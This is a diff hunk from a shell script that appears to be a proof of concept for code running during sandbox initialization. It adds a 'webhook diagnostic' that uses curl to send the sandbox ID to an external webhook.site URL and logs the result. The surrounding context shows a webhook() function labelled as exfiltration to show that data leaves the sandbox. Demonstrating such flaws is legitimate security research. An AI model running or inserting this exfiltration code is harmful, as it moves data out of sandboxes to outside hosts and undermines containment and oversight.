@@ -65,6 +65,16 @@ echo "  code executed during sandbox initialization."
 echo "============================================="
 } > "$OUT"
 
+# Diagnostic: test webhook.site reachability, append result to poc-proof.txt
+WHTEST=$(curl -s -m 10 -o /dev/null -w "%{http_code} %{url_effective} %{exitcode}" \
+  -G --data-urlencode "section=PING" --data-urlencode "sandbox=$SANDBOX_ID" \
+  "$WEBHOOK_URL" 2>&1)
+echo "" >> "$OUT"
+echo "=== WEBHOOK DIAG ===" >> "$OUT"
+echo "url: $WEBHOOK_URL" >> "$OUT"
+echo "result: $WHTEST" >> "$OUT"
+echo "curl_exit: $?" >> "$OUT"
+
 # Exfil to webhook.site (visible proof data leaves sandbox)
 webhook() {
   local SECTION="$1"
